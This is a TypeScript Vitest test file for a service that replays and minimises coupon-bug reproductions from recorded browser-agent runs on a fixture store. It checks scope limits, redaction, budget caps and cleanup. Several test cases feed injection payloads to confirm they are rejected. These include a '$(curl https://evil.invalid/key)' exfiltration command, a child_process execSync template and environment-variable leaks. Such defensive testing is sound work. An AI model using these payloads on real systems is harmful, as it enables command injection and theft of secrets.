import { randomUUID } from "node:crypto";
import { DatabaseSync } from "node:sqlite";
import { mkdirSync, rmSync } from "node:fs";
import { resolve } from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import { DEFAULT_REPRODUCTION_LIMITS, reproductionCreateSchema, type ReproductionLimits } from "../../lib/reproduction-contracts";
import { exportCouponRegression, groundCouponReproduction, reproductionMigration, ReproductionService } from "./reproduction";
import { classifyCouponOutcome, createReservedReproductionRunner, REPRODUCTION_SIGNATURE, runCouponWithWorkerDriver, type CandidateRunner } from "./reproduction-runner";
import { makeReproductionSource, sampleCouponEvents } from "./reproduction-test-support";
import { fixtureNavigationMarker } from "./reproduction-grounding";
import { ArtifactWriter } from "../execution/artifacts";
import { ArtifactReader, getRawArtifactJson } from "../reports/artifacts";
import type { ExecutionEvent } from "../execution/types";

const databases: DatabaseSync[] = [];
afterEach(() => { for (const db of databases.splice(0)) db.close(); });
const healthy = { fixtureHealthy: true, unexpectedError: false, couponsApplied: false, expectedTotal: false };
function harness(runner: CandidateRunner = async () => ({
  outcome: "reproduced", signature: REPRODUCTION_SIGNATURE, cleanup: "confirmed", environment: "trusted_fixture", sessionIdentity: randomUUID(),
}), limits: ReproductionLimits = DEFAULT_REPRODUCTION_LIMITS) {
  const db = new DatabaseSync(":memory:");
  databases.push(db);
  db.exec(reproductionMigration);
  const input = makeReproductionSource();
  const owner = randomUUID(), run = input.source.run.id, attempt = input.source.attempts[0].id;
  const hooks = { loadSource: (requester: string) => {
    if (requester !== owner) throw new Error("unauthorized");
    return input;
  }, runner, reservationSeconds: 15, limits };
  const service = new ReproductionService(db, hooks);
  const job = service.prepare(owner, run, attempt);
  return { db, input, owner, run, attempt, service, job, hooks };
}

describe("grounded safe regression compiler", () => {
  it("rejects inherited scopes that cannot reach every fixed setup route before candidate allocation", async () => {
    const h = harness();
    h.db.prepare("DELETE FROM reproductions WHERE id=?").run(h.job.id);
    h.input.source.run.scope.targetUrl = "https://fixture.flash-flood.invalid/demo/cart";
    h.input.source.run.scope.pathPrefixes = ["/demo/cart"];
    const runner = vi.fn<CandidateRunner>();
    const service = new ReproductionService(h.db, { ...h.hooks, runner });
    const denied = service.prepare(h.owner, h.run, h.attempt);
    expect(denied).toMatchObject({ status: "unsupported", reason: "unsupported_target", candidatesAttempted: 0 });
    expect(service.dispatchNext()).toBeNull();
    expect(await service.runNext()).toBe(false);
    expect(runner).not.toHaveBeenCalled();
    expect(h.db.prepare("SELECT count(*) AS n FROM reproduction_candidates").get()?.n).toBe(0);
    h.input.source.run.scope.pathPrefixes = ["/demo/cart", "/demo/product/mug"];
    expect(groundCouponReproduction(h.input, h.attempt).status).toBe("ready");
    h.input.source.run.scope.allowedSubdomains = ["untrusted.invalid"];
    expect(groundCouponReproduction(h.input, h.attempt)).toMatchObject({ reason: "unsupported_target" });
  });
  it("grounds actual ArtifactWriter-redacted navigation using only a trusted finite marker", async () => {
    const events = sampleCouponEvents();
    const navigate: ExecutionEvent = {
      kind: "action", actor: "agent", steps: 1,
      action: { actor: "agent", action: "navigate", candidateId: null,
        value: "https://fixture.flash-flood.invalid/demo/cart", commentary: "Safe fixture setup" },
    };
    const input = makeReproductionSource([events[0], navigate, ...events]);
    const directory = resolve("data", `reproduction-grounding-${randomUUID()}`);
    mkdirSync(directory, { recursive: true, mode: 0o700 });
    try {
      const item = input.evidence[1];
      const artifact = await new ArtifactWriter({ dataDir: directory }).writeJson(
        item.metadata.runId, item.metadata.attemptId,
        { ...navigate, fixtureNavigation: fixtureNavigationMarker(navigate.action.value) },
      );
      item.storageKey = artifact.key;
      input.source.evidence[1].storageKey = artifact.key;
      const read = new ArtifactReader({ dataDir: directory }).read({
        evidence: item.metadata, storageKey: artifact.key, runId: item.metadata.runId, attemptId: item.metadata.attemptId,
      });
      expect(read.status).toBe("available");
      item.data = getRawArtifactJson(read);
      expect(item.data).toMatchObject({
        action: { value: "[REDACTED_URL]" }, fixtureNavigation: "store-cart",
      });
      expect(JSON.stringify(item.data)).not.toContain("https://fixture.flash-flood.invalid");
      expect(groundCouponReproduction(input, input.source.attempts[0].id).status).toBe("ready");
      const persisted = item.data as Record<string, unknown>;
      delete persisted.fixtureNavigation;
      expect(groundCouponReproduction(input, input.source.attempts[0].id)).toMatchObject({ reason: "unsupported_action" });
      persisted.fixtureNavigation = "https://evil.invalid/?secret=value";
      expect(groundCouponReproduction(input, input.source.attempts[0].id)).toMatchObject({ reason: "ambiguous_evidence" });
    } finally { rmSync(directory, { recursive: true, force: true }); }
  });
  it("never assigns navigation markers to secret, hostile, ambiguous, or out-of-fixture URLs", () => {
    expect(fixtureNavigationMarker("https://fixture.flash-flood.invalid/demo")).toBe("store-home");
    expect(fixtureNavigationMarker("https://fixture.flash-flood.invalid/demo/category/home")).toBe("store-home-category");
    expect(fixtureNavigationMarker("https://fixture.flash-flood.invalid/demo/product/mug")).toBe("store-mug");
    for (const value of [
      "https://fixture.flash-flood.invalid/demo/cart?secret=value",
      "https://fixture.flash-flood.invalid/demo/cart#secret",
      "https://user:secret@fixture.flash-flood.invalid/demo/cart",
      "https://evil.invalid/demo/cart", "/demo/cart", "[REDACTED_URL]", "'\n`${bad}",
    ]) expect(fixtureNavigationMarker(value)).toBeNull();
  });
  it("requires explicit paid authorization and rejects caller-supplied budget overrides", () => {
    const attemptId = randomUUID();
    expect(reproductionCreateSchema.safeParse({ attemptId }).success).toBe(false);
    expect(reproductionCreateSchema.safeParse({ attemptId, authorizationAcknowledged: false }).success).toBe(false);
    expect(reproductionCreateSchema.safeParse({ attemptId, authorizationAcknowledged: true }).success).toBe(true);
    expect(reproductionCreateSchema.safeParse({ attemptId, authorizationAcknowledged: true, candidates: 100 }).success).toBe(false);
  });
  it("imports the offline script without starting a fixture server or browser", async () => {
    const { runReproductionOffline } = await import("../../../scripts/reproduction-offline");
    expect(typeof runReproductionOffline).toBe("function");
  });
  it("emits only fixed schema data, real assertions, and explicit reset/seed", () => {
    const input = makeReproductionSource();
    const result = groundCouponReproduction(input, input.source.attempts[0].id);
    expect(result.status).toBe("ready");
    if (result.status !== "ready") throw new Error("Expected grounded recipe");
    const source = exportCouponRegression(result.recipe);
    expect(source).toContain("prepareCouponFixture");
    expect(source).toContain("observed.expectedTotal");
    expect(source).toContain("observed.exactFailure");
    expect(source).not.toMatch(/eval\(|new Function|TODO|test\.skip|test\.fixme/);
    for (const item of input.evidence) expect(source).not.toContain(item.storageKey);
    expect(source).not.toContain(input.source.run.id);
  });
  it.each(["'\n`;process.exit(); //", "${require('child_process').execSync('bad')}", "$(curl https://evil.invalid/key)", "https://user:secret@evil.invalid/?key=secret", "bb_live_secret", "[REDACTED]"])(
    "does not replay or emit untrusted typed input %j", (payload) => {
      const events = sampleCouponEvents();
      const typed = events.find((event) => event.kind === "action" && event.action.action === "type");
      if (typed?.kind !== "action") throw new Error("Missing action");
      events[events.indexOf(typed)] = { ...typed, action: { ...typed.action, value: payload } };
      const input = makeReproductionSource(events);
      const result = groundCouponReproduction(input, input.source.attempts[0].id);
      expect(result).toEqual({ status: "setup_required", reason: "secret_setup_required" });
      expect(JSON.stringify(result)).not.toContain(payload);
    },
  );
  it("refuses arbitrary URLs, unavailable evidence, human actions, and ambiguous selectors", () => {
    const input = makeReproductionSource(), attempt = input.source.attempts[0].id;
    input.source.run.scope.targetUrl = "https://public.invalid/demo";
    expect(groundCouponReproduction(input, attempt)).toMatchObject({ reason: "unsupported_target" });
    input.source.run.scope.targetUrl = "https://fixture.flash-flood.invalid/demo";
    input.evidence[0].state = "unavailable";
    expect(groundCouponReproduction(input, attempt)).toMatchObject({ reason: "unavailable_evidence" });
    input.evidence[0].state = "available";
    const data = input.evidence[1].data as { actor: string };
    data.actor = "human";
    expect(groundCouponReproduction(input, attempt)).toMatchObject({ reason: "human_actions" });
    data.actor = "agent";
    const observation = input.evidence[0].data as { observation: { candidates: unknown[] } };
    observation.observation.candidates.push({ id: "another", kind: "input", label: "Coupon code" });
    expect(groundCouponReproduction(input, attempt)).toMatchObject({ reason: "ambiguous_evidence" });
  });
  it("rejects purchases and an unrelated exception instead of generating a fake pass", () => {
    const events = sampleCouponEvents();
    const first = events[0];
    if (first.kind !== "observation") throw new Error("Missing observation");
    events[0] = { ...first, observation: { ...first.observation, candidates: [{ id: "c0", kind: "button", label: "Place demo order" }] } };
    const action = events[1];
    if (action.kind !== "action") throw new Error("Missing action");
    events[1] = { ...action, action: { ...action.action, action: "click" } };
    const input = makeReproductionSource(events);
    expect(groundCouponReproduction(input, input.source.attempts[0].id)).toMatchObject({ reason: "destructive_action" });
    expect(classifyCouponOutcome({ ...healthy, exactFailure: false, unexpectedError: true })).toEqual({ outcome: "unknown", signature: null });
    expect(classifyCouponOutcome({ ...healthy, exactFailure: true })).toEqual({ outcome: "reproduced", signature: REPRODUCTION_SIGNATURE });
    expect(classifyCouponOutcome({ ...healthy, exactFailure: true, expectedTotal: true }).outcome).toBe("unknown");
  });
  it("fails closed for takeover history and unknown source cleanup", () => {
    const input = makeReproductionSource(), attempt = input.source.attempts[0].id;
    input.humanActions = true;
    expect(groundCouponReproduction(input, attempt)).toMatchObject({ reason: "human_actions" });
    input.humanActions = false;
    input.source.summaries[0].summary = null;
    expect(groundCouponReproduction(input, attempt)).toMatchObject({ reason: "unavailable_evidence" });
  });
  it.each(["'\n`);throw Error('injected')", "${process.env.KEY}", "$(echo secret)", "https://evil.invalid/?key=secret"])(
    "does not compile adversarial selectors or recipe data %j", (payload) => {
      const input = makeReproductionSource(), attempt = input.source.attempts[0].id;
      const observed = input.evidence[0].data as { observation: { candidates: { label: string }[] } };
      observed.observation.candidates[0].label = payload;
      const result = groundCouponReproduction(input, attempt);
      expect(result.status).not.toBe("ready");
      expect(JSON.stringify(result)).not.toContain(payload);
      expect(() => exportCouponRegression({
        version: "coupon-reproduction-v1", fixture: "store", predicate: "second-coupon-error-and-missing-discount-v1",
        steps: [{ kind: "fill_coupon", coupon: payload as "SAVE10" }],
      })).toThrow();
    },
  );
});

describe("durable cumulative bounded reduction", () => {
  it.each(["queued", "running", "settling", "uncertain_cleanup"] as const)(
    "does not poison lifetime admission when the source is transiently %s", (state) => {
      const db = new DatabaseSync(":memory:");
      databases.push(db);
      db.exec(reproductionMigration);
      const input = makeReproductionSource(), owner = randomUUID();
      const attempt = input.source.attempts[0], summary = input.source.summaries[0];
      if (state === "queued" || state === "running") attempt.status = state;
      if (state === "settling") summary.launchState = "active";
      if (state === "uncertain_cleanup") summary.summary!.cleanup.status = "failed";
      const service = new ReproductionService(db, { loadSource: () => input, reservationSeconds: 15 });
      expect(() => service.prepare(owner, input.source.run.id, attempt.id)).toThrow("conflict");
      expect(db.prepare("SELECT count(*) AS n FROM reproductions").get()?.n).toBe(0);
      expect(db.prepare("SELECT count(*) AS n FROM reproduction_candidates").get()?.n).toBe(0);
      attempt.status = "target_failed";
      summary.launchState = "settled";
      summary.summary!.cleanup.status = "closed";
      const job = service.prepare(owner, input.source.run.id, attempt.id);
      expect(job.status).toBe("queued");
      service.dispatchNext();
      attempt.status = "running";
      expect(service.prepare(owner, input.source.run.id, attempt.id)).toMatchObject({
        id: job.id, candidatesAttempted: 1, reservedSecondsCharged: 15,
      });
    },
  );
  it.each([
    { reservationSeconds: 300, absoluteWindow: 240_000 },
    { reservationSeconds: 60, absoluteWindow: 65_000 },
  ])("separates replay time from startup while retaining absolute TTL/workflow ceiling %j", ({ reservationSeconds, absoluteWindow }) => {
    const limits = {
      ...DEFAULT_REPRODUCTION_LIMITS, candidates: 3, candidateMs: 60_000, durationMs: 240_000, reservedSeconds: 900,
    };
    const h = harness(undefined, limits);
    let now = Date.parse(h.job.createdAt);
    const service = new ReproductionService(h.db, { ...h.hooks, reservationSeconds, clock: () => now });
    const dispatch = service.dispatchNext()!;
    expect(dispatch.maxDurationMs).toBe(60_000);
    expect(dispatch.deadline).toBe(now + absoluteWindow);
    now += 61_000;
    expect(service.candidateDispatch(dispatch.candidateId)).not.toBeNull();
    now = dispatch.deadline;
    expect(service.candidateDispatch(dispatch.candidateId)).toBeNull();
    expect(service.recoverExpired()).toBe(1);
    expect(service.status(h.owner, h.job.id)).toMatchObject({
      status: "unknown_cleanup", candidatesAttempted: 1, reservedSecondsCharged: reservationSeconds,
    });
  });
  it("does not dispatch a driver action beyond inherited worker step capacity", async () => {
    const driver = { observe: vi.fn(), act: vi.fn(), close: vi.fn(async () => ({ status: "closed" as const, errors: [] })) };
    const result = await runCouponWithWorkerDriver({
      reproductionId: randomUUID(), candidateId: randomUUID(),
      steps: [{ kind: "fill_coupon", coupon: "SAVE10" }], signature: REPRODUCTION_SIGNATURE,
      reservationSeconds: 15, maxDurationMs: 1000, maxSteps: 3, signal: new AbortController().signal,
    }, { driver, sessionIdentity: randomUUID() });
    expect(result).toMatchObject({ outcome: "unknown", cleanup: "confirmed" });
    expect(driver.observe).not.toHaveBeenCalled();
    expect(driver.act).not.toHaveBeenCalled();
    expect(driver.close).toHaveBeenCalledOnce();
  });
  it("dispatches a durable outbox without allocating and settles only exact idempotent worker results", async () => {
    const h = harness();
    const service = new ReproductionService(h.db, {
      loadSource: h.hooks.loadSource, reservationSeconds: 15,
    });
    await expect(service.runNext()).rejects.toThrow("unavailable");
    expect(service.status(h.owner, h.job.id).candidatesAttempted).toBe(0);
    const dispatched = service.dispatchNext()!;
    expect(dispatched).toMatchObject({
      ownerId: h.owner, sourceRunId: h.run, sourceAttemptId: h.attempt,
      reproductionId: h.job.id, reservationSeconds: 15, signature: REPRODUCTION_SIGNATURE,
    });
    expect(service.status(h.owner, h.job.id)).toMatchObject({
      status: "running", candidatesAttempted: 1, reservedSecondsCharged: 15, stepsCharged: 8,
    });
    const restarted = new ReproductionService(h.db, { loadSource: h.hooks.loadSource, reservationSeconds: 15 });
    expect(restarted.pendingCandidates()).toEqual([dispatched]);
    expect(restarted.dispatchNext()).toBeNull();
    const result = { outcome: "reproduced" as const, signature: REPRODUCTION_SIGNATURE,
      cleanup: "confirmed" as const, environment: "trusted_fixture" as const, sessionIdentity: randomUUID() };
    expect(restarted.completeCandidate(dispatched.candidateId, result)).toBe(true);
    expect(restarted.completeCandidate(dispatched.candidateId, result)).toBe(false);
    expect(restarted.pendingCandidates()).toEqual([]);
    expect(restarted.status(h.owner, h.job.id)).toMatchObject({ status: "queued", shortestSteps: 5, candidatesAttempted: 1 });
  });
  it("removes cancelled outbox candidates from worker eligibility without refunding", () => {
    const h = harness(), dispatched = h.service.dispatchNext()!;
    h.service.cancel(h.owner, h.job.id);
    expect(h.service.candidateDispatch(dispatched.candidateId)).toBeNull();
    expect(h.service.pendingCandidates()).toEqual([]);
    h.service.completeCandidate(dispatched.candidateId, {
      outcome: "unknown", signature: null, cleanup: "confirmed", environment: "uncertain", sessionIdentity: "",
    }, true);
    expect(h.service.status(h.owner, h.job.id)).toMatchObject({
      status: "cancelled", candidatesAttempted: 1, reservedSecondsCharged: 15,
    });
  });
  it("requires baseline, removes only reproducing candidates, and exports shortest FOUND", async () => {
    const seen: number[] = [];
    const h = harness(async (input) => {
      seen.push(input.steps.length);
      const reproduced = input.steps.filter((step) => step.kind === "fill_coupon").length === 2 &&
        input.steps.filter((step) => step.kind === "apply_coupon").length === 2;
      return { outcome: reproduced ? "reproduced" : "not_reproduced", signature: reproduced ? REPRODUCTION_SIGNATURE : null,
        cleanup: "confirmed", environment: "trusted_fixture", sessionIdentity: randomUUID() };
    });
    while (await h.service.runNext()) { /* Drain durable candidate queue. */ }
    const result = h.service.status(h.owner, h.job.id);
    expect(result).toMatchObject({ status: "found", originalSteps: 5, shortestSteps: 4, modelCalls: 0, exportAvailable: true });
    expect(result.notice).toContain("not a claim of global minimality");
    expect(seen[0]).toBe(5);
    expect(result.candidatesAttempted).toBe(seen.length);
    expect(result.stepsCharged).toBe(seen.reduce((sum, length) => sum + length + 3, 0));
    expect(h.service.export(h.owner, h.job.id)).not.toContain('"kind": "wait"');
  });
  it.each([
    { candidates: 1 }, { steps: 8 }, { reservedSeconds: 15 }, { durationMs: 15_000 },
  ])("does not replenish a lifetime cap or repeat an attempt %j", async (cap) => {
    const h = harness(undefined, { ...DEFAULT_REPRODUCTION_LIMITS, ...cap });
    expect(await h.service.runNext()).toBe(true);
    await h.service.runNext();
    expect(h.service.status(h.owner, h.job.id)).toMatchObject({ status: "limit_reached", candidatesAttempted: 1 });
    const reopened = new ReproductionService(h.db, h.hooks);
    expect(reopened.prepare(h.owner, h.run, h.attempt).id).toBe(h.job.id);
    expect(await reopened.runNext()).toBe(false);
    expect(reopened.status(h.owner, h.job.id).candidatesAttempted).toBe(1);
  });
  it.each(["unknown", "wrong_signature", "cleanup", "environment", "throws"] as const)("counts and stops on %s", async (kind) => {
    const h = harness(async () => {
      if (kind === "throws") throw new Error("secret provider detail");
      return { outcome: kind === "unknown" ? "unknown" : "reproduced",
        signature: kind === "wrong_signature" ? null : REPRODUCTION_SIGNATURE,
        cleanup: kind === "cleanup" ? "unknown" : "confirmed",
        environment: kind === "environment" ? "uncertain" : "trusted_fixture", sessionIdentity: randomUUID() };
    });
    await h.service.runNext();
    expect(h.service.status(h.owner, h.job.id)).toMatchObject({
      status: kind === "cleanup" || kind === "throws" ? "unknown_cleanup" : "uncertain_environment",
      candidatesAttempted: 1, reservedSecondsCharged: 15, exportAvailable: false,
    });
    expect(await h.service.runNext()).toBe(false);
    expect(() => h.service.export(h.owner, h.job.id)).toThrow();
    expect(JSON.stringify(h.service.status(h.owner, h.job.id))).not.toContain("secret provider detail");
  });
  it("rejects reuse of the same browser across candidates", async () => {
    const h = harness(async () => ({
      outcome: "reproduced", signature: REPRODUCTION_SIGNATURE, cleanup: "confirmed", environment: "trusted_fixture", sessionIdentity: "same-browser",
    }));
    await h.service.runNext();
    await h.service.runNext();
    expect(h.service.status(h.owner, h.job.id)).toMatchObject({ status: "uncertain_environment", candidatesAttempted: 2 });
  });
  it("blocks cross-owner reads/export/cancel and cancels before any browser allocation", async () => {
    const runner = vi.fn<CandidateRunner>();
    const h = harness(runner);
    expect(() => h.service.status(randomUUID(), h.job.id)).toThrow("not_found");
    expect(() => h.service.export(randomUUID(), h.job.id)).toThrow("not_found");
    expect(() => h.service.cancel(randomUUID(), h.job.id)).toThrow("not_found");
    expect(h.service.cancel(h.owner, h.job.id).status).toBe("cancelled");
    expect(await h.service.runNext()).toBe(false);
    expect(runner).not.toHaveBeenCalled();
  });
  it("cancels active work, waits for confirmed cleanup, and retains its full charges", async () => {
    const h = harness(async (input) => {
      h.service.cancel(h.owner, h.job.id);
      await new Promise<void>((resolve) => input.signal.addEventListener("abort", () => resolve(), { once: true }));
      return { outcome: "unknown", signature: null, cleanup: "confirmed", environment: "uncertain", sessionIdentity: randomUUID() };
    });
    await h.service.runNext();
    expect(h.service.status(h.owner, h.job.id)).toMatchObject({ status: "cancelled", candidatesAttempted: 1, reservedSecondsCharged: 15 });
  });
  it("recovers expired work as unknown cleanup without retry or refund", async () => {
    const h = harness();
    h.db.prepare("UPDATE reproductions SET status='running',deadline=0,candidate_count=1,seconds_charged=15 WHERE id=?").run(h.job.id);
    expect(h.service.recoverExpired()).toBe(1);
    expect(h.service.status(h.owner, h.job.id)).toMatchObject({ status: "unknown_cleanup", candidatesAttempted: 1, reservedSecondsCharged: 15 });
    expect(await h.service.runNext()).toBe(false);
  });
  it("requires durable production reservation before calling allocation", async () => {
    const order: string[] = [];
    const runner = createReservedReproductionRunner({
      reserve: async () => { order.push("reserve"); return { actualWorkerReservation: true }; },
      execute: async (_, reservation) => {
        expect(reservation.actualWorkerReservation).toBe(true);
        order.push("allocate");
        return { outcome: "not_reproduced", signature: null, cleanup: "confirmed", environment: "trusted_fixture", sessionIdentity: randomUUID() };
      },
    });
    const h = harness(runner);
    await h.service.runNext();
    expect(order).toEqual(["reserve", "allocate"]);
    expect(h.service.status(h.owner, h.job.id).status).toBe("not_reproduced");
  });
  it("retains spent lifetime capacity after closing and reopening the on-disk database", async () => {
    const directory = resolve("data", `reproduction-persistence-${randomUUID()}`);
    mkdirSync(directory, { recursive: true, mode: 0o700 });
    let db: DatabaseSync | undefined;
    try {
      const path = resolve(directory, "ledger.sqlite");
      db = new DatabaseSync(path);
      db.exec(reproductionMigration);
      const input = makeReproductionSource(), owner = randomUUID();
      const hooks = {
        loadSource: () => input, reservationSeconds: 15,
        limits: { ...DEFAULT_REPRODUCTION_LIMITS, candidates: 1 },
        runner: vi.fn<CandidateRunner>(async () => ({
          outcome: "reproduced", signature: REPRODUCTION_SIGNATURE, cleanup: "confirmed",
          environment: "trusted_fixture", sessionIdentity: randomUUID(),
        })),
      };
      const first = new ReproductionService(db, hooks);
      const job = first.prepare(owner, input.source.run.id, input.source.attempts[0].id);
      await first.runNext();
      db.close();
      db = new DatabaseSync(path);
      const restarted = new ReproductionService(db, hooks);
      expect(restarted.prepare(owner, job.runId, job.attemptId).id).toBe(job.id);
      expect(await restarted.runNext()).toBe(false);
      expect(restarted.status(owner, job.id)).toMatchObject({
        status: "limit_reached", candidatesAttempted: 1, reservedSecondsCharged: 15, durationMsCharged: 15_000,
      });
      expect(hooks.runner).toHaveBeenCalledTimes(1);
    } finally { db?.close(); rmSync(directory, { recursive: true, force: true }); }
  });
});
